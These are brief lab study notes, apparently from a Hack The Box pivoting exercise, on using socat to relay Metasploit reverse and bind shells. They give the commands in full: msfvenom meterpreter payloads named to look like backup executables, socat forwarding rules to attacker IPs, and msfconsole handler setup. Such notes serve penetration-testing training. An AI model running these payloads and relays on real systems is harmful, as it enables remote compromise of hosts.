# Socat Redirection with Reverse Shell
#socat
Command
`socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80`

Making the payload
`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080`

Using msfconsole
```bash
sudo msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run
```

# Socat Redirection with Bind Shell
![[Pasted image 20260701154248.png]]
```shell
# Attacker
Lazarus2858@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443

# Victim
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

# MSFConsole
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set rhost 10.129.202.64
set lport 8080
run
```